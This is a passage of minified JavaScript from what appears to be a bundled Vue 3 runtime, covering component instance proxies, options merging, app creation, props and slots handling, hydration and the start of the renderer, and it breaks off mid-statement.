getPublicInstance=e=>e?isStatefulComponent(e)?getExposeProxy(e)||e.proxy:getPublicInstance(e.parent):null,publicPropertiesMap=extend(Object.create(null),{$:e=>e,$el:e=>e.vnode.el,$data:e=>e.data,$props:e=>e.props,$attrs:e=>e.attrs,$slots:e=>e.slots,$refs:e=>e.refs,$parent:e=>getPublicInstance(e.parent),$root:e=>getPublicInstance(e.root),$emit:e=>e.emit,$options:e=>resolveMergedOptions(e),$forceUpdate:e=>e.f||(e.f=()=>queueJob(e.update)),$nextTick:e=>e.n||(e.n=nextTick.bind(e.proxy)),$watch:e=>instanceWatch.bind(e)}),hasSetupBinding=(e,t)=>e!==EMPTY_OBJ&&!e.__isScriptSetup&&hasOwn$1(e,t),PublicInstanceProxyHandlers={get({_:e},t){const{ctx:n,setupState:s,data:r,props:o,accessCache:l,type:d,appContext:u}=e;let f;if(t[0]!=="$"){const v=l[t];if(v!==void 0)switch(v){case 1:return s[t];case 2:return r[t];case 4:return n[t];case 3:return o[t]}else{if(hasSetupBinding(s,t))return l[t]=1,s[t];if(r!==EMPTY_OBJ&&hasOwn$1(r,t))return l[t]=2,r[t];if((f=e.propsOptions[0])&&hasOwn$1(f,t))return l[t]=3,o[t];if(n!==EMPTY_OBJ&&hasOwn$1(n,t))return l[t]=4,n[t];shouldCacheAccess&&(l[t]=0)}}const m=publicPropertiesMap[t];let g,y;if(m)return t==="$attrs"&&track(e,"get",t),m(e);if((g=d.__cssModules)&&(g=g[t]))return g;if(n!==EMPTY_OBJ&&hasOwn$1(n,t))return l[t]=4,n[t];if(y=u.config.globalProperties,hasOwn$1(y,t))return y[t]},set({_:e},t,n){const{data:s,setupState:r,ctx:o}=e;return hasSetupBinding(r,t)?(r[t]=n,!0):s!==EMPTY_OBJ&&hasOwn$1(s,t)?(s[t]=n,!0):hasOwn$1(e.props,t)||t[0]==="$"&&t.slice(1)in e?!1:(o[t]=n,!0)},has({_:{data:e,setupState:t,accessCache:n,ctx:s,appContext:r,propsOptions:o}},l){let d;return!!n[l]||e!==EMPTY_OBJ&&hasOwn$1(e,l)||hasSetupBinding(t,l)||(d=o[0])&&hasOwn$1(d,l)||hasOwn$1(s,l)||hasOwn$1(publicPropertiesMap,l)||hasOwn$1(r.config.globalProperties,l)},defineProperty(e,t,n){return n.get!=null?e._.accessCache[t]=0:hasOwn$1(n,"value")&&this.set(e,t,n.value,null),Reflect.defineProperty(e,t,n)}},RuntimeCompiledPublicInstanceProxyHandlers=extend({},PublicInstanceProxyHandlers,{get(e,t){if(t!==Symbol.unscopables)return PublicInstanceProxyHandlers.get(e,t,e)},has(e,t){return t[0]!=="_"&&!isGloballyWhitelisted(t)}});function defineProps(){return null}function defineEmits(){return null}function defineExpose(e){}function defineOptions(e){}function defineSlots(){return null}function defineModel(){}function withDefaults(e,t){return null}function useSlots(){return getContext().slots}function useAttrs(){return getContext().attrs}function useModel(e,t,n){const s=getCurrentInstance();if(n&&n.local){const r=ref(e[t]);return watch(()=>e[t],o=>r.value=o),watch(r,o=>{o!==e[t]&&s.emit(`update:${t}`,o)}),r}else return{__v_isRef:!0,get value(){return e[t]},set value(r){s.emit(`update:${t}`,r)}}}function getContext(){const e=getCurrentInstance();return e.setupContext||(e.setupContext=createSetupContext(e))}function normalizePropsOrEmits(e){return isArray$2(e)?e.reduce((t,n)=>(t[n]=null,t),{}):e}function mergeDefaults(e,t){const n=normalizePropsOrEmits(e);for(const s in t){if(s.startsWith("__skip"))continue;let r=n[s];r?isArray$2(r)||isFunction$1(r)?r=n[s]={type:r,default:t[s]}:r.default=t[s]:r===null&&(r=n[s]={default:t[s]}),r&&t[`__skip_${s}`]&&(r.skipFactory=!0)}return n}function mergeModels(e,t){return!e||!t?e||t:isArray$2(e)&&isArray$2(t)?e.concat(t):extend({},normalizePropsOrEmits(e),normalizePropsOrEmits(t))}function createPropsRestProxy(e,t){const n={};for(const s in e)t.includes(s)||Object.defineProperty(n,s,{enumerable:!0,get:()=>e[s]});return n}function withAsyncContext(e){const t=getCurrentInstance();let n=e();return unsetCurrentInstance(),isPromise(n)&&(n=n.catch(s=>{throw setCurrentInstance(t),s})),[n,()=>setCurrentInstance(t)]}let shouldCacheAccess=!0;function applyOptions(e){const t=resolveMergedOptions(e),n=e.proxy,s=e.ctx;shouldCacheAccess=!1,t.beforeCreate&&callHook$1(t.beforeCreate,e,"bc");const{data:r,computed:o,methods:l,watch:d,provide:u,inject:f,created:m,beforeMount:g,mounted:y,beforeUpdate:v,updated:x,activated:E,deactivated:S,beforeDestroy:w,beforeUnmount:k,destroyed:C,unmounted:R,render:L,renderTracked:O,renderTriggered:I,errorCaptured:A,serverPrefetch:j,expose:G,inheritAttrs:X,components:q,directives:J,filters:K}=t;if(f&&resolveInjections(f,s,null),l)for(const de in l){const oe=l[de];isFunction$1(oe)&&(s[de]=oe.bind(n))}if(r){const de=r.call(n,n);isObject$2(de)&&(e.data=reactive(de))}if(shouldCacheAccess=!0,o)for(const de in o){const oe=o[de],ge=isFunction$1(oe)?oe.bind(n,n):isFunction$1(oe.get)?oe.get.bind(n,n):NOOP,ke=!isFunction$1(oe)&&isFunction$1(oe.set)?oe.set.bind(n):NOOP,ye=computed({get:ge,set:ke});Object.defineProperty(s,de,{enumerable:!0,configurable:!0,get:()=>ye.value,set:he=>ye.value=he})}if(d)for(const de in d)createWatcher(d[de],s,n,de);if(u){const de=isFunction$1(u)?u.call(n):u;Reflect.ownKeys(de).forEach(oe=>{provide(oe,de[oe])})}m&&callHook$1(m,e,"c");function se(de,oe){isArray$2(oe)?oe.forEach(ge=>de(ge.bind(n))):oe&&de(oe.bind(n))}if(se(onBeforeMount,g),se(onMounted,y),se(onBeforeUpdate,v),se(onUpdated,x),se(onActivated,E),se(onDeactivated,S),se(onErrorCaptured,A),se(onRenderTracked,O),se(onRenderTriggered,I),se(onBeforeUnmount,k),se(onUnmounted,R),se(onServerPrefetch,j),isArray$2(G))if(G.length){const de=e.exposed||(e.exposed={});G.forEach(oe=>{Object.defineProperty(de,oe,{get:()=>n[oe],set:ge=>n[oe]=ge})})}else e.exposed||(e.exposed={});L&&e.render===NOOP&&(e.render=L),X!=null&&(e.inheritAttrs=X),q&&(e.components=q),J&&(e.directives=J)}function resolveInjections(e,t,n=NOOP){isArray$2(e)&&(e=normalizeInject(e));for(const s in e){const r=e[s];let o;isObject$2(r)?"default"in r?o=inject(r.from||s,r.default,!0):o=inject(r.from||s):o=inject(r),isRef(o)?Object.defineProperty(t,s,{enumerable:!0,configurable:!0,get:()=>o.value,set:l=>o.value=l}):t[s]=o}}function callHook$1(e,t,n){callWithAsyncErrorHandling(isArray$2(e)?e.map(s=>s.bind(t.proxy)):e.bind(t.proxy),t,n)}function createWatcher(e,t,n,s){const r=s.includes(".")?createPathGetter(n,s):()=>n[s];if(isString$2(e)){const o=t[e];isFunction$1(o)&&watch(r,o)}else if(isFunction$1(e))watch(r,e.bind(n));else if(isObject$2(e))if(isArray$2(e))e.forEach(o=>createWatcher(o,t,n,s));else{const o=isFunction$1(e.handler)?e.handler.bind(n):t[e.handler];isFunction$1(o)&&watch(r,o,e)}}function resolveMergedOptions(e){const t=e.type,{mixins:n,extends:s}=t,{mixins:r,optionsCache:o,config:{optionMergeStrategies:l}}=e.appContext,d=o.get(t);let u;return d?u=d:!r.length&&!n&&!s?u=t:(u={},r.length&&r.forEach(f=>mergeOptions$1(u,f,l,!0)),mergeOptions$1(u,t,l)),isObject$2(t)&&o.set(t,u),u}function mergeOptions$1(e,t,n,s=!1){const{mixins:r,extends:o}=t;o&&mergeOptions$1(e,o,n,!0),r&&r.forEach(l=>mergeOptions$1(e,l,n,!0));for(const l in t)if(!(s&&l==="expose")){const d=internalOptionMergeStrats[l]||n&&n[l];e[l]=d?d(e[l],t[l]):t[l]}return e}const internalOptionMergeStrats={data:mergeDataFn,props:mergeEmitsOrPropsOptions,emits:mergeEmitsOrPropsOptions,methods:mergeObjectOptions,computed:mergeObjectOptions,beforeCreate:mergeAsArray$1,created:mergeAsArray$1,beforeMount:mergeAsArray$1,mounted:mergeAsArray$1,beforeUpdate:mergeAsArray$1,updated:mergeAsArray$1,beforeDestroy:mergeAsArray$1,beforeUnmount:mergeAsArray$1,destroyed:mergeAsArray$1,unmounted:mergeAsArray$1,activated:mergeAsArray$1,deactivated:mergeAsArray$1,errorCaptured:mergeAsArray$1,serverPrefetch:mergeAsArray$1,components:mergeObjectOptions,directives:mergeObjectOptions,watch:mergeWatchOptions,provide:mergeDataFn,inject:mergeInject};function mergeDataFn(e,t){return t?e?function(){return extend(isFunction$1(e)?e.call(this,this):e,isFunction$1(t)?t.call(this,this):t)}:t:e}function mergeInject(e,t){return mergeObjectOptions(normalizeInject(e),normalizeInject(t))}function normalizeInject(e){if(isArray$2(e)){const t={};for(let n=0;n<e.length;n++)t[e[n]]=e[n];return t}return e}function mergeAsArray$1(e,t){return e?[...new Set([].concat(e,t))]:t}function mergeObjectOptions(e,t){return e?extend(Object.create(null),e,t):t}function mergeEmitsOrPropsOptions(e,t){return e?isArray$2(e)&&isArray$2(t)?[...new Set([...e,...t])]:extend(Object.create(null),normalizePropsOrEmits(e),normalizePropsOrEmits(t??{})):t}function mergeWatchOptions(e,t){if(!e)return t;if(!t)return e;const n=extend(Object.create(null),e);for(const s in t)n[s]=mergeAsArray$1(e[s],t[s]);return n}function createAppContext(){return{app:null,config:{isNativeTag:NO,performance:!1,globalProperties:{},optionMergeStrategies:{},errorHandler:void 0,warnHandler:void 0,compilerOptions:{}},mixins:[],components:{},directives:{},provides:Object.create(null),optionsCache:new WeakMap,propsCache:new WeakMap,emitsCache:new WeakMap}}let uid$1=0;function createAppAPI(e,t){return function(s,r=null){isFunction$1(s)||(s=extend({},s)),r!=null&&!isObject$2(r)&&(r=null);const o=createAppContext(),l=new Set;let d=!1;const u=o.app={_uid:uid$1++,_component:s,_props:r,_container:null,_context:o,_instance:null,version,get config(){return o.config},set config(f){},use(f,...m){return l.has(f)||(f&&isFunction$1(f.install)?(l.add(f),f.install(u,...m)):isFunction$1(f)&&(l.add(f),f(u,...m))),u},mixin(f){return o.mixins.includes(f)||o.mixins.push(f),u},component(f,m){return m?(o.components[f]=m,u):o.components[f]},directive(f,m){return m?(o.directives[f]=m,u):o.directives[f]},mount(f,m,g){if(!d){const y=createVNode(s,r);return y.appContext=o,m&&t?t(y,f):e(y,f,g),d=!0,u._container=f,f.__vue_app__=u,getExposeProxy(y.component)||y.component.proxy}},unmount(){d&&(e(null,u._container),delete u._container.__vue_app__)},provide(f,m){return o.provides[f]=m,u},runWithContext(f){currentApp=u;try{return f()}finally{currentApp=null}}};return u}}let currentApp=null;function provide(e,t){if(currentInstance){let n=currentInstance.provides;const s=currentInstance.parent&&currentInstance.parent.provides;s===n&&(n=currentInstance.provides=Object.create(s)),n[e]=t}}function inject(e,t,n=!1){const s=currentInstance||currentRenderingInstance;if(s||currentApp){const r=s?s.parent==null?s.vnode.appContext&&s.vnode.appContext.provides:s.parent.provides:currentApp._context.provides;if(r&&e in r)return r[e];if(arguments.length>1)return n&&isFunction$1(t)?t.call(s&&s.proxy):t}}function hasInjectionContext(){return!!(currentInstance||currentRenderingInstance||currentApp)}function initProps(e,t,n,s=!1){const r={},o={};def(o,InternalObjectKey,1),e.propsDefaults=Object.create(null),setFullProps(e,t,r,o);for(const l in e.propsOptions[0])l in r||(r[l]=void 0);n?e.props=s?r:shallowReactive(r):e.type.props?e.props=r:e.props=o,e.attrs=o}function updateProps(e,t,n,s){const{props:r,attrs:o,vnode:{patchFlag:l}}=e,d=toRaw(r),[u]=e.propsOptions;let f=!1;if((s||l>0)&&!(l&16)){if(l&8){const m=e.vnode.dynamicProps;for(let g=0;g<m.length;g++){let y=m[g];if(isEmitListener(e.emitsOptions,y))continue;const v=t[y];if(u)if(hasOwn$1(o,y))v!==o[y]&&(o[y]=v,f=!0);else{const x=camelize(y);r[x]=resolvePropValue(u,d,x,v,e,!1)}else v!==o[y]&&(o[y]=v,f=!0)}}}else{setFullProps(e,t,r,o)&&(f=!0);let m;for(const g in d)(!t||!hasOwn$1(t,g)&&((m=hyphenate(g))===g||!hasOwn$1(t,m)))&&(u?n&&(n[g]!==void 0||n[m]!==void 0)&&(r[g]=resolvePropValue(u,d,g,void 0,e,!0)):delete r[g]);if(o!==d)for(const g in o)(!t||!hasOwn$1(t,g))&&(delete o[g],f=!0)}f&&trigger(e,"set","$attrs")}function setFullProps(e,t,n,s){const[r,o]=e.propsOptions;let l=!1,d;if(t)for(let u in t){if(isReservedProp(u))continue;const f=t[u];let m;r&&hasOwn$1(r,m=camelize(u))?!o||!o.includes(m)?n[m]=f:(d||(d={}))[m]=f:isEmitListener(e.emitsOptions,u)||(!(u in s)||f!==s[u])&&(s[u]=f,l=!0)}if(o){const u=toRaw(n),f=d||EMPTY_OBJ;for(let m=0;m<o.length;m++){const g=o[m];n[g]=resolvePropValue(r,u,g,f[g],e,!hasOwn$1(f,g))}}return l}function resolvePropValue(e,t,n,s,r,o){const l=e[n];if(l!=null){const d=hasOwn$1(l,"default");if(d&&s===void 0){const u=l.default;if(l.type!==Function&&!l.skipFactory&&isFunction$1(u)){const{propsDefaults:f}=r;n in f?s=f[n]:(setCurrentInstance(r),s=f[n]=u.call(null,t),unsetCurrentInstance())}else s=u}l[0]&&(o&&!d?s=!1:l[1]&&(s===""||s===hyphenate(n))&&(s=!0))}return s}function normalizePropsOptions(e,t,n=!1){const s=t.propsCache,r=s.get(e);if(r)return r;const o=e.props,l={},d=[];let u=!1;if(!isFunction$1(e)){const m=g=>{u=!0;const[y,v]=normalizePropsOptions(g,t,!0);extend(l,y),v&&d.push(...v)};!n&&t.mixins.length&&t.mixins.forEach(m),e.extends&&m(e.extends),e.mixins&&e.mixins.forEach(m)}if(!o&&!u)return isObject$2(e)&&s.set(e,EMPTY_ARR),EMPTY_ARR;if(isArray$2(o))for(let m=0;m<o.length;m++){const g=camelize(o[m]);validatePropName(g)&&(l[g]=EMPTY_OBJ)}else if(o)for(const m in o){const g=camelize(m);if(validatePropName(g)){const y=o[m],v=l[g]=isArray$2(y)||isFunction$1(y)?{type:y}:extend({},y);if(v){const x=getTypeIndex(Boolean,v.type),E=getTypeIndex(String,v.type);v[0]=x>-1,v[1]=E<0||x<E,(x>-1||hasOwn$1(v,"default"))&&d.push(g)}}}const f=[l,d];return isObject$2(e)&&s.set(e,f),f}function validatePropName(e){return e[0]!=="$"}function getType(e){const t=e&&e.toString().match(/^\s*(function|class) (\w+)/);return t?t[2]:e===null?"null":""}function isSameType(e,t){return getType(e)===getType(t)}function getTypeIndex(e,t){return isArray$2(t)?t.findIndex(n=>isSameType(n,e)):isFunction$1(t)&&isSameType(t,e)?0:-1}const isInternalKey=e=>e[0]==="_"||e==="$stable",normalizeSlotValue=e=>isArray$2(e)?e.map(normalizeVNode):[normalizeVNode(e)],normalizeSlot$1=(e,t,n)=>{if(t._n)return t;const s=withCtx((...r)=>normalizeSlotValue(t(...r)),n);return s._c=!1,s},normalizeObjectSlots=(e,t,n)=>{const s=e._ctx;for(const r in e){if(isInternalKey(r))continue;const o=e[r];if(isFunction$1(o))t[r]=normalizeSlot$1(r,o,s);else if(o!=null){const l=normalizeSlotValue(o);t[r]=()=>l}}},normalizeVNodeSlots=(e,t)=>{const n=normalizeSlotValue(t);e.slots.default=()=>n},initSlots=(e,t)=>{if(e.vnode.shapeFlag&32){const n=t._;n?(e.slots=toRaw(t),def(t,"_",n)):normalizeObjectSlots(t,e.slots={})}else e.slots={},t&&normalizeVNodeSlots(e,t);def(e.slots,InternalObjectKey,1)},updateSlots=(e,t,n)=>{const{vnode:s,slots:r}=e;let o=!0,l=EMPTY_OBJ;if(s.shapeFlag&32){const d=t._;d?n&&d===1?o=!1:(extend(r,t),!n&&d===1&&delete r._):(o=!t.$stable,normalizeObjectSlots(t,r)),l=t}else t&&(normalizeVNodeSlots(e,t),l={default:1});if(o)for(const d in r)!isInternalKey(d)&&!(d in l)&&delete r[d]};function setRef(e,t,n,s,r=!1){if(isArray$2(e)){e.forEach((y,v)=>setRef(y,t&&(isArray$2(t)?t[v]:t),n,s,r));return}if(isAsyncWrapper(s)&&!r)return;const o=s.shapeFlag&4?getExposeProxy(s.component)||s.component.proxy:s.el,l=r?null:o,{i:d,r:u}=e,f=t&&t.r,m=d.refs===EMPTY_OBJ?d.refs={}:d.refs,g=d.setupState;if(f!=null&&f!==u&&(isString$2(f)?(m[f]=null,hasOwn$1(g,f)&&(g[f]=null)):isRef(f)&&(f.value=null)),isFunction$1(u))callWithErrorHandling(u,d,12,[l,m]);else{const y=isString$2(u),v=isRef(u);if(y||v){const x=()=>{if(e.f){const E=y?hasOwn$1(g,u)?g[u]:m[u]:u.value;r?isArray$2(E)&&remove(E,o):isArray$2(E)?E.includes(o)||E.push(o):y?(m[u]=[o],hasOwn$1(g,u)&&(g[u]=m[u])):(u.value=[o],e.k&&(m[e.k]=u.value))}else y?(m[u]=l,hasOwn$1(g,u)&&(g[u]=l)):v&&(u.value=l,e.k&&(m[e.k]=l))};l?(x.id=-1,queuePostRenderEffect(x,n)):x()}}}let hasMismatch=!1;const isSVGContainer=e=>/svg/.test(e.namespaceURI)&&e.tagName!=="foreignObject",isComment=e=>e.nodeType===8;function createHydrationFunctions(e){const{mt:t,p:n,o:{patchProp:s,createText:r,nextSibling:o,parentNode:l,remove:d,insert:u,createComment:f}}=e,m=(w,k)=>{if(!k.hasChildNodes()){n(null,w,k),flushPostFlushCbs(),k._vnode=w;return}hasMismatch=!1,g(k.firstChild,w,null,null,null),flushPostFlushCbs(),k._vnode=w,hasMismatch&&console.error("Hydration completed but contains mismatches.")},g=(w,k,C,R,L,O=!1)=>{const I=isComment(w)&&w.data==="[",A=()=>E(w,k,C,R,L,I),{type:j,ref:G,shapeFlag:X,patchFlag:q}=k;let J=w.nodeType;k.el=w,q===-2&&(O=!1,k.dynamicChildren=null);let K=null;switch(j){case Text:J!==3?k.children===""?(u(k.el=r(""),l(w),w),K=w):K=A():(w.data!==k.children&&(hasMismatch=!0,w.data=k.children),K=o(w));break;case Comment:J!==8||I?K=A():K=o(w);break;case Static:if(I&&(w=o(w),J=w.nodeType),J===1||J===3){K=w;const le=!k.children.length;for(let se=0;se<k.staticCount;se++)le&&(k.children+=K.nodeType===1?K.outerHTML:K.data),se===k.staticCount-1&&(k.anchor=K),K=o(K);return I?o(K):K}else A();break;case Fragment:I?K=x(w,k,C,R,L,O):K=A();break;default:if(X&1)J!==1||k.type.toLowerCase()!==w.tagName.toLowerCase()?K=A():K=y(w,k,C,R,L,O);else if(X&6){k.slotScopeIds=L;const le=l(w);if(t(k,le,null,C,R,isSVGContainer(le),O),K=I?S(w):o(w),K&&isComment(K)&&K.data==="teleport end"&&(K=o(K)),isAsyncWrapper(k)){let se;I?(se=createVNode(Fragment),se.anchor=K?K.previousSibling:le.lastChild):se=w.nodeType===3?createTextVNode(""):createVNode("div"),se.el=w,k.component.subTree=se}}else X&64?J!==8?K=A():K=k.type.hydrate(w,k,C,R,L,O,e,v):X&128&&(K=k.type.hydrate(w,k,C,R,isSVGContainer(l(w)),L,O,e,g))}return G!=null&&setRef(G,null,R,k),K},y=(w,k,C,R,L,O)=>{O=O||!!k.dynamicChildren;const{type:I,props:A,patchFlag:j,shapeFlag:G,dirs:X}=k,q=I==="input"&&X||I==="option";if(q||j!==-1){if(X&&invokeDirectiveHook(k,null,C,"created"),A)if(q||!O||j&48)for(const K in A)(q&&K.endsWith("value")||isOn(K)&&!isReservedProp(K))&&s(w,K,null,A[K],!1,void 0,C);else A.onClick&&s(w,"onClick",null,A.onClick,!1,void 0,C);let J;if((J=A&&A.onVnodeBeforeMount)&&invokeVNodeHook(J,C,k),X&&invokeDirectiveHook(k,null,C,"beforeMount"),((J=A&&A.onVnodeMounted)||X)&&queueEffectWithSuspense(()=>{J&&invokeVNodeHook(J,C,k),X&&invokeDirectiveHook(k,null,C,"mounted")},R),G&16&&!(A&&(A.innerHTML||A.textContent))){let K=v(w.firstChild,k,w,C,R,L,O);for(;K;){hasMismatch=!0;const le=K;K=K.nextSibling,d(le)}}else G&8&&w.textContent!==k.children&&(hasMismatch=!0,w.textContent=k.children)}return w.nextSibling},v=(w,k,C,R,L,O,I)=>{I=I||!!k.dynamicChildren;const A=k.children,j=A.length;for(let G=0;G<j;G++){const X=I?A[G]:A[G]=normalizeVNode(A[G]);if(w)w=g(w,X,R,L,O,I);else{if(X.type===Text&&!X.children)continue;hasMismatch=!0,n(null,X,C,null,R,L,isSVGContainer(C),O)}}return w},x=(w,k,C,R,L,O)=>{const{slotScopeIds:I}=k;I&&(L=L?L.concat(I):I);const A=l(w),j=v(o(w),k,A,C,R,L,O);return j&&isComment(j)&&j.data==="]"?o(k.anchor=j):(hasMismatch=!0,u(k.anchor=f("]"),A,j),j)},E=(w,k,C,R,L,O)=>{if(hasMismatch=!0,k.el=null,O){const j=S(w);for(;;){const G=o(w);if(G&&G!==j)d(G);else break}}const I=o(w),A=l(w);return d(w),n(null,k,A,I,C,R,isSVGContainer(A),L),I},S=w=>{let k=0;for(;w;)if(w=o(w),w&&isComment(w)&&(w.data==="["&&k++,w.data==="]")){if(k===0)return o(w);k--}return w};return[m,g]}const queuePostRenderEffect=queueEffectWithSuspense;function createRenderer(e){return baseCreateRenderer(e)}function createHydrationRenderer(e){return baseCreateRenderer(e,createHydrationFunctions)}function baseCreateRenderer(e,t){const n=getGlobalThis$1();n.__VUE__=!0;const{insert:s,remove:r,patchProp:o,createElement:l,createText:d,createComment:u,setText:f,setElementText:m,parentNode:g,nextSibling:y,setScopeId:v=NOOP,insertStaticContent:x}=e,E=(M,T,_,N=null,P=null,D=null,V=!1,U=null,z=!!T.dynamicChildren)=>{if(M===T)return;M&&!isSameVNodeType(M,T)&&(N=W(M),he(M,P,D,!0),M=null),T.patchFlag===-2&&(z=!1,T.dynamicChildren=null);const{type:H,ref:Y,shapeFlag:B}=T;switch(H){case Text:S(M,T,_,N);break;case Comment:w(M,T,_,N);break;case Static:M==null&&k(T,_,N,V);break;case Fragment:q(M,T,_,N,P,D,V,U,z);break;default:B&1?L(M,T,_,N,P,D,V,U,z):B&6?J(M,T,_,N,P,D,V,U,z):(B&64||B&128)&&H.process(M,T,_,N,P,D,V,U,z,Z)}Y!=null&&P&&setRef(Y,M&&M.ref,D,T||M,!T)},S=(M,T,_,N)=>{if(M==null)s(T.el=d(T.children),_,N);else{const P=T.el=M.el;T.children!==M.children&&f(P,T.children)}},w=(M,T,_,N)=>{M==null?s(T.el=u(T.children||""),_,N):T.el=M.el},k=(M,T,_,N)=>{[M.el,M.anchor]=x(M.children,T,_,N,M.el,M.anchor)},C=({el:M,anchor:T},_,N)=>{let P;for(;M&&M!==T;)P=y(M),s(M,_,N),M=P;s(T,_,N)},R=({el:M,anchor:T})=>{let _;for(;M&&M!==T;)_=y(M),r(M),M=_;r(T)},L=(M,T,_,N,P,D,V,U,z)=>{V=V||T.type==="svg",M==null?O(T,_,N,P,D,V,U,z):j(M,T,P,D,V,U,z)},O=(M,T,_,N,P,D,V,U)=>{let z,H;const{type:Y,props:B,shapeFlag:F,transition:ee,dirs:te}=M;if(z=M.el=l(M.type,D,B&&B.is,B),F&8?m(z,M.children):F&16&&A(M.children,z,null,N,P,D&&Y!=="foreignObject",V,U),te&&invokeDirectiveHook(M,null,N,"created"),I(z,M,M.scopeId,V,N),B){for(const ae in B)ae!=="value"&&!isReservedProp(ae)&&o(z,ae,null,B[ae],D,M.children,N,P,me);"value"in B&&o(z,"value",null,B.value),(H=B.onVnodeBeforeMount)&&invokeVNodeHook(H,N,M)}te&&invokeDirectiveHook(M,null,N,"beforeMount");const re=(!P||P&&!P.pendingBranch)&&ee&&!ee.persisted;re&&ee.beforeEnter(z),s(z,T,_),((H=B&&B.onVnodeMounted)||re||te)&&queuePostRenderEffect(()=>{H&&invokeVNodeHook(H,N,M),re&&ee.enter(z),te&&invokeDirectiveHook(M,null,N,"mounted")},P)},I=(M,T,_,N,P)=>{if(_&&v(M,_),N)for(let D=0;D<N.length;D++)v(M,N[D]);if(P){let D=P.subTree;if(T===D){const V=P.vnode;I(M,V,V.scopeId,V.slotScopeIds,P.parent)}}},A=(M,T,_,N,P,D,V,U,z=0)=>{for(let H=z;H<M.length;H++){const Y=M[H]=U?cloneIfMounted(M[H]):normalizeVNode(M[H]);E(null,Y,T,_,N,P,D,V,U)}},j=(M,T,_,N,P,D,V)=>{const U=T.el=M.el;let{patchFlag:z,dynamicChildren:H,dirs:Y}=T;z|=M.patchFlag&16;const B=M.props||EMPTY_OBJ,F=T.props||EMPTY_OBJ;let ee;_&&toggleRecurse(_,!1),(ee=F.onVnodeBeforeUpdate)&&invokeVNodeHook(ee,_,T,M),Y&&invokeDirectiveHook(T,M,_,"beforeUpdate"),_&&toggleRecurse(_,!0);const te=P&&T.type!=="foreignObject";if(H?G(M.dynamicChildren,H,U,_,N,te,D):V||oe(M,T,U,null,_,N,te,D,!1),z>0){if(z&16)X(U,T,B,F,_,N,P);else if(z&2&&B.class!==F.class&&o(U,"class",null,F.class,P),z&4&&o(U,"style",B.style,F.style,P),z&8){const re=T.dynamicProps;for(let ae=0;ae<re.length;ae++){const ie=re[ae],ce=B[ie],ve=F[ie];(ve!==ce||ie==="value")&&o(U,ie,ce,ve,P,M.children,_,N,me)}}z&1&&M.children!==T.children&&m(U,T.children)}else!V&&H==null&&X(U,T,B,F,_,N,P);((ee=F.onVnodeUpdated)||Y)&&queuePostRenderEffect(()=>{ee&&invokeVNodeHook(ee,_,T,M),Y&&invokeDirectiveHook(T,M,_,"updated")},N)},G=(M,T,_,N,P,D,V)=>{for(let U=0;U<T.length;U++){const z=M[U],H=T[U],Y=z.el&&(z.type===Fragment||!isSameVNodeType(z,H)||z.shapeFlag&70)?g(z.el):_;E(z,H,Y,null,N,P,D,V,!0)}},X=(M,T,_,N,P,D,V)=>{if(_!==N){if(_!==EMPTY_OBJ)for(const U in _)!isReservedProp(U)&&!(U in N)&&o(M,U,_[U],null,V,T.children,P,D,me);for(const U in N){if(isReservedProp(U))continue;const z=N[U],H=_[U];z!==H&&U!=="value"&&o(M,U,H,z,V,T.children,P,D,me)}"value"in N&&o(M,"value",_.value,N.value)}},q=(M,T,_,N,P,D,V,U,z)=>{const H=T.el=M?M.el:d(""),Y=T.anchor=M?M.anchor:d("");let{patchFlag:B,dynamicChildren:F,slotScopeIds:ee}=T;ee&&(U=U?U.concat(ee):ee),M==null?(s(H,_,N),s(Y,_,N),A(T.children,_,Y,P,D,V,U,z)):B>0&&B&64&&F&&M.dynamicChildren?(G(M.dynamicChildren,F,_,P,D,V,U),(T.key!=null||P&&T===P.subTree)&&traverseStaticChildren(M,T,!0)):oe(M,T,_,Y,P,D,V,U,z)},J=(M,T,_,N,P,D,V,U,z)=>{T.slotScopeIds=U,M==null?T.shapeFlag&512?P.ctx.activate(T,_,N,V,z):K(T,_,N,P,D,V,z):le(M,T,z)},K=(M,T,_,N,P,D,V)=>{const U=M.component=createComponentInstance(M,N,P);if(isKeepAlive(M)&&(U.ctx.renderer=Z),setupComponent(U),U.asyncDep){if(P&&P.registerDep(U,se),!M.el){const z=U.subTree=createVNode(Comment);w(null,z,T,_)}return}se(U,M,T,_,P,D,V)},le=(M,T,_)=>{const N=T.component=M.component;if(shouldUpdateComponent(M,T,_))if(N.asyncDep&&!N.asyncResolved){de(N,T,_);return}else N.next=T,invalidateJob(N.update),N.update();else T.el=M.el,N.vnode=T},se=(M,T,_,N,P,D,V)=>{const U=()=>{if(M.isMounted){let{next:Y,bu:B,u:F,parent:ee,vnode:te}=M,re=Y,ae;toggleRecurse(M,!1),Y?(Y.el=te.el,de(M,Y,V)):Y=te,B&&invokeArrayFns(B),(ae=Y.props&&Y.props.onVnodeBeforeUpdate)&&invokeVNodeHook(ae,ee,Y,te),toggleRecurse(M,!0);const ie=renderComponentRoot(M),ce=M.subTree;M.subTree=ie,E(ce,ie,g(ce.el),W(ce),M,P,D),Y.el=ie.el,re===null&&updateHOCHostEl(M,ie.el),F&&queuePostRenderEffect(F,P),(ae=Y.props&&Y.props.onVnodeUpdated)&&queuePostRenderEffect(()=>invokeVNodeHook(ae,ee,Y,te),P)}else{let Y;const{el:B,props:F}=T,{bm:ee,m:te,parent:re}=M,ae=isAsyncWrapper(T);if(toggleRecurse(M,!1),ee&&invokeArrayFns(ee),!ae&&(Y=F&&F.onVnodeBeforeMount)&&invokeVNodeHook(Y,re,T),toggleRecurse(M,!0),B&&fe){const ie=()=>{M.subTree=renderComponentRoot(M),fe(B,M.subTree,M,P,null)};ae?T.type.__asyncLoader().then(()=>!M.isUnmounted&&ie()):ie()}else{const ie=M.subTree=renderComponentRoot(M);E(null,ie,_,N,M,P,D),T.el=ie.el}if(te&&queuePostRenderEffect(te,P),!ae&&(Y=F&&F.onVnodeMounted)){const ie=T;queuePostRenderEffect(()=>invokeVNodeHook(Y,re,ie),P)}(T.shapeFlag&256||re&&isAsyncWrapper(re.vnode)&&re.vnode.shapeFlag&256)&&M.a&&queuePostRenderEffect(M.a,P),M.isMounted=!0,T=_=N=null}},z=M.effect=new ReactiveEffect(U,()=>queueJob(H),M.scope),H=M.update=()=>z.run();H.id=M.uid,toggleRecurse(M,!0),H()},de=(M,T,_)=>{T.component=M;const N=M.vnode.props;M.vnode=T,M.next=null,updateProps(M,T.props,N,_),updateSlots(M,T.children,_),pauseTracking(),flushPreFlushCbs(),resetTracking()},oe=(M,T,_,N,P,D,V,U,z=!1)=>{const 